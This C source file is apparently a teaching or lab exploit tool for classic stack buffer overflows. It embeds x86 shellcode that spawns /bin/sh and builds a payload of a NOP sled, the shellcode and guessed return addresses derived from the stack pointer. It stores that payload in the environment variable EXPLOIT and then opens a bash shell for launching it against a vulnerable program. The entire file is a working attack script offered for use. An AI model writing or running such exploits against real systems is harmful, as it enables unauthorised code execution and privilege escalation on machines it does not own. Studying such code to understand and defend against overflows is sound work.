#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = 
  "\x55"
  "\x89\xe5"
  "\xeb\x0e"
  "\x5b"
  "\x31\xc9"
  "\x88\x4b\x07"
  "\x31\xd2"
  "\x31\xc0"
  "\xb0\x0b"
  "\xcd\x80"
  "\xe8\xed\xff\xff\xff"
  "/bin/sh"
  ;

void print_info(int ret) {
  printf("%% Exploit 1\n");
  printf("%% Payload set in variable $EXPLOIT\n");
  printf("%% Using return address: 0x%x\n",ret);
}

int get_esp() {
  asm("mov %esp,%eax");
}

int main(int argc, char* argv[]) {  
  int bsize;
  int soff;
  int ret_addr;
  
  char* buffer;
  int* int_buf;

  int i;

  if (argc != 3) {
    printf("Usage: ./exploit1 BUFFER_SIZE STACK_OFFSET\n");
    exit(0);
  }
 
  bsize = atoi(argv[1]);
  soff = atoi(argv[2]);

  buffer = (char*) malloc (bsize);
  int_buf = (int*) buffer;

  ret_addr = get_esp() - soff;

  /* fill buffer with return address */
  for (i=0;i<bsize/sizeof(int);i++)
    int_buf[i] = ret_addr;
  
  /* create nop slide */
  for (i=0;i<bsize/2;i++)
    buffer[i] = '\x90';

  for (;i<bsize/2+strlen(shellcode);i++)
    buffer[i] = shellcode[i-bsize/2];

  setenv("EXPLOIT",buffer,1);

  print_info(ret_addr);
  
  system("/bin/bash");

  free(buffer);
}
